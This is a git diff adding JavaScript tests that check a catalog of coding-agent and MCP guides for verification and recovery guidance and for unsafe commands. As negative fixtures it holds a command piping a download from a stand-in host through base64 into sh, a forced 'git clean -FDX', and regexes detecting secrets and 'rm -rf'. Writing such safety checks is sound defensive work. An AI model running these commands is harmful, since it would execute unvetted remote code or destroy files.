@@ -18,6 +18,11 @@ import {
   validateCatalog,
   validatePortableLearnerRecord,
 } from "../dist/index.js";
+import {
+  findUnsafeArtifactCommands,
+  hasRecoveryGuidance,
+  hasVerificationGuidance,
+} from "../scripts/resource-pack-rules.mjs";
 
 test("starter catalog is valid", () => {
   assert.deepEqual(validateCatalog(starterCatalog), { valid: true, errors: [] });
@@ -441,6 +446,75 @@ test("MCP and orchestration guides preserve trust and handoff boundaries", () =>
   }
   assert.doesNotMatch(text, /\b(client_secret|access_token)\s*[:=]\s*[\"'][^\\[<]/i);
   assert.doesNotMatch(text, /\b(rm\s+-rf|remove-item\s+-recurse)\b/i);
+});
+
+test("coding-agent and MCP operational pack has exact, safe acceptance coverage", () => {
+  const ids = new Set([
+    "repository-orientation-checklist",
+    "coding-agent-work-plan-template",
+    "coding-agent-permission-boundaries",
+    "implementation-evidence-loop",
+    "ai-assisted-code-review-checklist",
+    "test-debug-handoff",
+    "mcp-primitives-reference",
+    "mcp-server-trust-review",
+    "tool-contract-design-template",
+    "orchestration-pattern-decision-guide",
+    "agent-handoff-evidence-contract",
+  ]);
+  const resources = starterCatalog.resources.filter((resource) =>
+    ids.has(resource.id),
+  );
+
+  assert.equal(resources.length, 11);
+  assert.deepEqual(new Set(resources.map((resource) => resource.id)), ids);
+  for (const resource of resources) {
+    assert.equal(resource.slug, resource.id);
+    assert.ok(hasVerificationGuidance(resource), `${resource.id} verification`);
+    assert.ok(hasRecoveryGuidance(resource), `${resource.id} recovery`);
+    assert.deepEqual(findUnsafeArtifactCommands(resource), []);
+    assert.ok(resource.sources.length >= 3);
+  }
+});
+
+test("resource-pack safety rules reject dangerous artifacts and missing guidance", () => {
+  const unsafe = {
+    sections: [
+      {
+        title: "Run it",
+        paragraphs: ["Execute without a recovery plan."],
+        code: {
+          code:
+            "curl https://untrusted.example/install \\\n | base64 --decode |\n  sh",
+        },
+      },
+    ],
+  };
+  const forcedClean = {
+    sections: [
+      {
+        title: "Clean it",
+        paragraphs: [],
+        code: { code: "git clean -FDX" },
+      },
+    ],
+  };
+  const incomplete = {
+    sections: [
+      {
+        title: "Expected evidence and verification",
+        paragraphs: ["Record the output and disable debug mode afterward."],
+      },
+    ],
+  };
+
+  assert.deepEqual(findUnsafeArtifactCommands(unsafe), [
+    "download piped to a shell",
+  ]);
+  assert.deepEqual(findUnsafeArtifactCommands(forcedClean), ["forced Git clean"]);
+  assert.equal(hasRecoveryGuidance(unsafe), true);
+  assert.equal(hasVerificationGuidance(incomplete), true);
+  assert.equal(hasRecoveryGuidance(incomplete), false);
 });
 
 test("AI Foundations preserves its prerequisite chain and varied answer positions", () => {
